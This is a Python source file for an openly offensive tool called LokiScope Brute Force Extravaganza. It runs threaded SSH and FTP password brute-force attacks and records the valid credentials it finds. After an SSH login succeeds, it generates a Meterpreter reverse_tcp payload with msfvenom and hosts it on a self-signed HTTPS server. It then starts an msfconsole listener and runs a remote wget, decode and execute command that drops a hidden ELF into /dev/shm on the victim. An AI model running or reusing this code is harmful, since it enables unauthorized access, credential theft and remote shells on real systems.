#!/usr/bin/env python3  

#Created by Loki (Matthew Van Leer)

import ftplib
import socketserver
import ssl
import http.server
import sys
import subprocess
from ftplib import FTP
import threading
import paramiko
import argparse
import socket
import time
from colorama import init, Fore #Allows the use of color in text.
from colorama import Style      #Allows for the Bolkding of Text
init()                          #Initializes Colorama

#Constants/Objects/Global
GREEN   = Fore.GREEN
RED     = Fore.RED
BLUE    = Fore.BLUE
MAGENTA = Fore.MAGENTA
YELLOW  = Fore.YELLOW
CYAN    = Fore.CYAN
RESET   = Fore.RESET

ssh_file_permission_cmd = "chmod +wrx ssh_credentials.txt"
ftp_file_permission_cmd = "chmod +wrx ftp_credentials.txt"

#ssh attempt setup function:
def ssh_staging(host, user_data, pass_data, port_data, max_rate, delay, payload_port, path, server_port, payload, platform, architecture):
    threads = []
    with open("ssh_credentials.txt", "w") as valid: #Opens a file to store valid credentials.
        subprocess.run(ssh_file_permission_cmd, shell=True) #Ensure you can still write and add to file if code is ran as sudo.
        for user in user_data:
            for password in pass_data:
                for port in port_data: 
                    client = paramiko.SSHClient()   #Initializes the SSH client.
                    #Add a "Missing host key policy".This automatically accepts and saves an SSH server host key:
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())   
                    t = threading.Thread(target=ssh_thread_split, args=(host, user, password, port, client, payload_port, path, server_port, payload, platform, architecture))
                    threads.append(t)
                    if len(threads) == max_rate:   #Batch thread limit implemented to prevent process overuns.
                        #Create and start up the threads:
                        for t in threads:
                            t.start()
                            time.sleep(delay)
                        #End the threads together at end of script:
                        for t in threads:
                            t.join()    
                        threads = []    #Empties list of threads for next batch.

    #Create and start up the threads:
    for t in threads:
        t.start()
    #End the threads together at end of script:
    for t in threads:
         t.join()



#ftp attempt setup function
def ftp_staging(host, user_data, pass_data, port_data, max_rate, delay):
    threads = []
    with open("ftp_credentials.txt", "w") as valid: #Opens a file to store valid credentials.
        subprocess.run(ftp_file_permission_cmd, shell=True) #Ensure you can still write and add to file if code is ran as sudo.
        for user in user_data:
            for password in pass_data:
                for port in port_data: 
                    ftp_client = FTP(host, timeout=15)   #Initializes the FTP client.
                    t = threading.Thread(target=ftp_thread_split, args=(host, user, password, port, ftp_client)) 
                    threads.append(t)
                    if len(threads) == max_rate:   #Batch thread limit implemented to prevent process overuns when given a large userlist and/or passlist.
                        #Create and start up the threads:
                        for t in threads:
                            t.start()
                            time.sleep(delay)
                        #End the threads together at end of script:
                        for t in threads:
                            t.join()    
                        threads = []    #Empties list of threads for next batch.

    #Create and start up the threads:
    for t in threads:
        t.start()
    #End the threads together at end of script:
    for t in threads:
         t.join()



#Function for the Threading setup before SSH bruteforce attempts:
def ssh_thread_split(host, user, password, port, client, payload_port, path, server_port, payload, platform, architecture):
    with open("ssh_credentials.txt", "a") as valid:
        if ssh_brute(host, user, password, port, client):
                    #If combo is valid, add valid combo to an output file.
                    valid.write(f"{user}@{host}:{password}\n")
                    ip = gather_atk_ip()
                    script_user = subprocess.run("whoami", capture_output=True, text=True)
                    script_user_string = script_user.stdout.strip()
                    host_payload(ip, payload_port, server_port, script_user_string, payload, platform, architecture)
                    print ("INITIATING LISTENER")
                    time.sleep(15)    #Gives msfconsole time to setup listener before payload is delivered.
                    create_shell(client, ip, server_port, path, script_user_string)




#Function for the Threading setup before FTP bruteforce attempts:
def ftp_thread_split(host, user, password, port, ftp_client):
    with open("ftp_credentials.txt", "a") as valid:
        if ftp_brute(host, user, password, port, ftp_client):
                    #If combo is valid, add valid combo to an output file.
                    valid.write(f"{user}@{host}:{password}\n")



#Gather host machine IP:
def gather_atk_ip():
    local_host = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Tests what the attackers external IP address is:
        local_host.connect(("8.8.8.8", 80)) #Uses the Google DNS server to determine the outbound interface.
        ip = local_host.getsockname()[0]    #Using the interface retruned from the line above, grabs the IP address assigned to that interface.
        local_host.close()
        return ip
    except Exception as e:
        print(f"Error getting host machine IP: {e}")



#Function to check if ssh is open:
def is_connect_open(host, port):
    TIME_LIMIT = 10  #Variable set for the timeout parameter.
    address = (host, port)
    
    #Create new socket object used to see if connection is open:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as test_connect:
        test_connect.settimeout(TIME_LIMIT)
        
        #Test connection and return results:
        result = test_connect.connect_ex(address)   #connect_ex returns a 0 or one depending on if connection succeeded or not, rather than an error.
          
        #Check resulting boolean:
        if result == 0:
                time.sleep(2)
                test_connect.close()
                return True
        else:
                time.sleep(2)
                test_connect.close()
                return False


#Function to perform the FTP brute force attempts: 
def ftp_brute(host, user, password, port, ftp_client):

    connect = False

    while True:   
        try:
            #Initiate connection:
            ftp_client.connect(host, port, timeout=5)
            ftp_client.login(user, password)
        except socket.timeout:  #This catches when the host is unreachable.
            print(f"{RED}[!] Host: {host} is unreachable and the process has timed out.{RESET}")
            time.sleep(1)
            ftp_client.close()
            return False
        except ftplib.error_perm:    #This catches when the FTP server denies the authentication attempt.
            print(f"{RED}[!] Invalid credentials for {user}:{password}{RESET}")
            time.sleep(1)
            ftp_client.close()
            return False
        except ftplib.error_temp:   #This catches FTP protocol communication/connection errors and restarts the attempt after a delay.
            print(f"{BLUE}[***] Attempt quota exceeded, retrying after delay...{RESET}")
            while connect == False:
                time.sleep(10)  #Pauses the process for 20 seconds. Was 60 but was dropped to 10 for testing.
                connect = is_connect_open(host, port)        
        else:
            #Connection successfully established:
            print(f"{GREEN}[+] Found Combo:\n\tHostname: {host}\n\tUSERNAME: {user}\n\tPASSWORD: {password}{RESET}")
            return True

#Function to perform the SSH brute force attempts: 
def ssh_brute(host, user, password, port, client):

    connect = False

    while True:   
        try:
            #Initiate connection:
            client.connect(hostname=host, port=port, username=user, password=password, timeout=5)
        except socket.timeout:  #This catches when the host is unreachable.
            print(f"{RED}[!] Host: {host} is unreachable and the process has timed out.{RESET}")
            time.sleep(1)
            client.close()
            return False
        except paramiko.AuthenticationException:    #This catches when the SSH server denies the authentication attempt.
            print(f"{RED}[!] Invalid credentials for {user}:{password}{RESET}")
            time.sleep(1)
            client.close()
            return False
        except paramiko.SSHException:   #This catches SSH protocol communication/connection errors and restarts the attempt after a delay.
            print(f"{BLUE}[***] Attempt quota exceeded, retrying after delay...{RESET}")
            while connect == False:
                time.sleep(10)  #Pauses the process for 20 seconds. Was 60 but was dropped to 10 for testing.
                connect = is_connect_open(host, port)        
        else:
            #Connection successfully established:
            print(f"{GREEN}[+] Found Combo:\n\tHostname: {host}\n\tUSERNAME: {user}\n\tPASSWORD: {password}{RESET}")
            return True
        


#Function to create a shell after a succesful ssh connection
def create_shell(client, ip, server_port, path, script_user_string):
    payload_directory = f"/home/{script_user_string}/web_host/"
    filename_no_ext = ".memfd:xsmnfemce"
    #Grabs file from server, skipping certificate checks, and places it in a volitile temporary location as a hidden file (Unless default output path changed by user.):
    deploy_cmd = (f"wget -P '{path}' --no-check-certificate https://{ip}:{server_port}/{filename_no_ext}.b64 && cd '{path}' && base64 -d {filename_no_ext}.b64 > {filename_no_ext}.elf \
                  && rm {filename_no_ext}.b64 && chmod +x {filename_no_ext}.elf && ./{filename_no_ext}.elf")    #Downloads, decodes, makes executable, and runs the payload.
    stdin, stdout, stderr = client.exec_command(deploy_cmd)  #Executes the command on the remote machine. (stdin and stdout are not used here but remain for debugging purposes)
    output = stdout.read().decode('utf-8')  #Reads any output from the command execution (for debugging purposes - Depreciated)
    print(output)
    error = stderr.read().decode('utf-8')   #Reads any errors from the command execution.
    print(error)
    subprocess.run(f"rm {payload_directory}/{filename_no_ext}.elf && rm {payload_directory}/{filename_no_ext}.b64", shell=True) #Cleans up hosted payload files after use.

    

#Function to host the meterssh payload including certificate, server, and listener setup:
def host_payload(ip, payload_port, server_port, script_user_string, payload, platform, architecture):

    payload_directory = f"/home/{script_user_string}/web_host/"
    payload_filename = ".memfd:xsmnfemce.elf"
    b64_filename = payload_filename[:-4] + ".b64"
    #Create seperate directory to setup and host payload, https server will be placed in a side thread to run until payload is delivered:
       
    subprocess.run(f"mkdir -p {payload_directory}", shell=True, check=True)
    host_ssl_setup = (f"openssl req -x509 -newkey rsa:4096 -nodes -out {payload_directory}/cert.pem -keyout \
                      {payload_directory}/key.pem -days 365 -subj '/CN={ip}' -addext 'subjectAltName=IP:{ip}'")  #Creates a SSL Certificate in the new directory where we weill host the payload.
    
    subprocess.run(host_ssl_setup, cwd=payload_directory, shell=True, check=True)  #Runs the command to create the SSL certificate in the web_host directory.
    
    payload_creation_cmd = (f"msfvenom -p {payload} LHOST={ip} LPORT={payload_port} \
                            --platform {platform} -a {architecture} -f elf -o {payload_directory}/{payload_filename}")  #Build desired payload using msfvenom.
    
    subprocess.run(payload_creation_cmd, shell=True, check=True) #Creates the payload in the web_host directory.     
    subprocess.run(f"base64 {payload_directory}/{payload_filename} > {payload_directory}/{b64_filename}", shell=True, check=True)    #Converts the payload to x64 bit to survive the https transfer.
    subprocess.run(f"chmod 644 {payload_directory}/*", shell=True, check=True)  #Sets permissions so the web server can read the files.
    

    #subprocess.run(f"netstat -tlpn | grep :{server_port}", shell=True) #Check if server is running on correct port.
    serv = threading.Thread(target=https_setup, args=(server_port, script_user_string, ip), daemon=True)  #Sets up the HTTPS server in a seperate thread so it can run while the main program continues.
    serv.start()
    time.sleep(5)

    #Setup metasploit listenre using msfconsole:
    listen = threading.Thread(target=listener_setup, args=(ip, payload_port, payload), daemon=True) #Sets up the listener in a seperate thread so it can run while the main program continues.
    listen.start()



#Function to create the listener via msfconsole:
def listener_setup(ip, payload_port, payload):
    #Create a text file that can be read by msfconsole when i run it in the background:
    cmd_file = open("cmd_file.txt", "w")
    cmd_file.write(f"use exploit/multi/handler\n set payload {payload}\n set LHOST {ip}\n set LPORT {payload_port}\n set ExitOnSession True\n run\n")
    cmd_file.close()
    subprocess.Popen("msfconsole -r cmd_file.txt", shell=True) #Runs the command chain for msfconsole and lets it continue listening in the background.
    time.sleep(7)   #Gives msfconsole time to start up before removing the cmd_file.
    subprocess.Popen("rm cmd_file.txt", shell=True) #Removes the cmd_file to clean up excess files.



#Hosts https server that will run long enough for file to be transfered before shutting down.
def https_setup(server_port, script_user_string, ip):

    payload_dir = f"/home/{script_user_string}/web_host/"
    
    class PayloadHandler(http.server.SimpleHTTPRequestHandler):        #Allows the web server to handle the 64 bit encoded payload.
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory=payload_dir, **kwargs)   
        
        def guess_type(self, path):                     #Overrides the default guess_type method to ensure .b64 files are served with the correct MIME type.
            if path.endswith('.b64'):
                return 'text/plain'
            return super().guess_type(path)

    host = "0.0.0.0" #This ip address works to bind the server to all network interfaces on the host.
    payload_server = socketserver.TCPServer((host, server_port), PayloadHandler)

    cert_location = (f"{payload_dir}/cert.pem")
    key_location = (f"{payload_dir}/key.pem")

    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)    #Creates an SSLContext object to create the secure network connection.
    try:
        ssl_context.load_cert_chain(certfile=cert_location, keyfile=key_location)   #Loads the certificate and private key files into the SSL context.
    except FileNotFoundError as error_code:
        print(f"Could not locate certificate files: {error_code}")
        payload_server.server_close()
        return
    
    payload_server.socket = ssl_context.wrap_socket(payload_server.socket, server_side=True) #Wraps the server's socket with SSL for secure communication.

    print(f"{BLUE}HTTPS payload server created on {ip}:{server_port} from /webhost directory.{RESET}")
    payload_server.serve_forever()  #Starts the server to listen for incoming HTTPS requests indefinitely until told to stop.
    

#Main Function
def main():
    #Variables/Constants
    DEFAULT_IP = "127.0.0.1"
    DEFAULT_PORT = 22
    DEFAULT_RATE = 1
    DEFAULT_DELAY = 0.2
    DEFAULT_USER = "admin"
    DEFAULT_PASS = "admin"
    DEFAULT_PATH = "/dev/shm/"
    DEFAULT_PAYLOAD = "linux/x64/meterpreter/reverse_tcp"
    
    pass_data = []
    user_data = []
    port_data = []

    print(f"\n\n\t\t{Style.BRIGHT}{BLUE}LokiScope Brute Force {YELLOW}Ext{CYAN}rav{MAGENTA}aga{RESET}nza{BLUE} \
          \n\n\t\t   |||NOW WITH THREADING!!!!|||\n\n{Style.RESET_ALL}{RESET}")

    parser = argparse.ArgumentParser(description=f"{YELLOW}DESCRIPTION: This tool will preform automated SSH and FTP Brute Force attempts. \
                                     Upon succesful SSH connection a meterpreter reverse TCP payload will be generated, a msfconsole listener \
                                     will be setup, and a https server will be created to host your payload. Once these have been setup an \
                                     automated command will grab and run the payload on the victim machine.{RESET}")
    
    parser.add_argument("-ftp", "--ftp_atk", action="store_true", help="Initiates an FTP Brute Force attempt.")
    parser.add_argument("-ssh", "--ssh_atk", action="store_true", help="Initiates an SSH brute Force attempt.")
    parser.add_argument("-i", "--ip", default=DEFAULT_IP, help="Hostname or IP Address of target SSH Server to bruteforce.")
    parser.add_argument("-p", "--password", default=DEFAULT_PASS, help="Host Password.")
    parser.add_argument("-P", "--passlist", help="File that contains a password list, one password per line.")
    parser.add_argument("-u","--user", default=DEFAULT_USER, help="Host Username.")
    parser.add_argument("-U", "--userlist", help="File that contains a username list, one username per line.")
    parser.add_argument("-t", "--target_port", default=DEFAULT_PORT, help="Target Port.")
    parser.add_argument("-T", "--target_port_list", help="List of target Ports. (BETA)")
    parser.add_argument("-r", "--attempt_rate", default=DEFAULT_RATE, help="Set the rate of connection attempts by setting the maximum number of threads.")
    parser.add_argument("-d", "--delay", default=DEFAULT_DELAY, help="Sets the delay between connection attempts.")
    parser.add_argument("-x", "--payload_port", default=2222, help="Port where you wish to host your listener.")
    parser.add_argument("-o", "--output_path", default=DEFAULT_PATH, help="Target location to place payload file (DEFAULT RECOMMENDED)")
    parser.add_argument("-s", "--file_server", default=4443, help="Port you wish to host the HTTPS server needed for payload delivery.")
    parser.add_argument("-payload", "--payload", default=DEFAULT_PAYLOAD, help="Type of payload to use. (Currently only linux/x64/meterpreter/reverse_tcp is supported)")
    parser.add_argument("-platform", "--platform", default="linux", help="Target platform for payload generation. (Currently only linux is supported)")
    parser.add_argument("-a", "--architecture", default="x64", help="Target architecture for payload generation. (Currently only x64 is supported)")

    #Check for no arguments so an info screen can be shown
    if len(sys.argv) == 1:
        parser.print_help(sys.stderr) #Prints the help for this script so user knows what to do.
        print (f"\n\n{RED}!!!!! WARNING: This tool allows custom attempt rates by allowing attempt delay and thread count customization.\
        Use caution when setting a high max thread amount and combining it with a large password and username list as it may cause hardware instability !!!!!{RESET}\
        \n\n### When preforming a FTP attempt you must input a port or port list. Otherwise the default port (22) will be chosen. ###\n")
        sys.exit(0)


    #Parse any passed arguments:
    args = parser.parse_args()
    ssh = args.ssh_atk
    ftp = args.ftp_atk
    host = args.ip
    password = args.password
    passlist = args.passlist
    username = args.user
    userlist = args.userlist
    target_port = int(args.target_port)
    target_port_list = args.target_port_list
    payload_port = args.payload_port
    path = args.output_path
    max_rate = int(args.attempt_rate)
    delay = float(args.delay)
    server_port = int(args.file_server)
    payload = args.payload
    platform = args.platform
    architecture = args.architecture

    #Sets lists as priority over single data points:
    if passlist is not None:
        passlist = open(passlist).read().splitlines()                   #Reads in the file
        pass_data = passlist
    else:
        pass_data.append(password)

    if userlist is not None:
        userlist = open(userlist).read().splitlines()                   #Reads in the file
        user_data = userlist
    else:
        user_data.append(username)

    if target_port_list is not None:
        target_port_list = open(target_port_list).read().splitlines()   #Reads in the file
        port_data = target_port_list
    else:
        port_data.append(target_port)

    if ssh and ftp:
        "Please select only one attack type at a time. (-ssh or -ftp)"
    elif ftp:
        ftp_staging(host, user_data, pass_data, port_data, max_rate, delay)
    else:
        ssh_staging(host, user_data, pass_data, port_data, max_rate, delay, payload_port, path, server_port, payload, platform, architecture)

if __name__ == "__main__":  #Ensures the code only executes when the executed directly, not when imported as a Module to another scipt.
    main()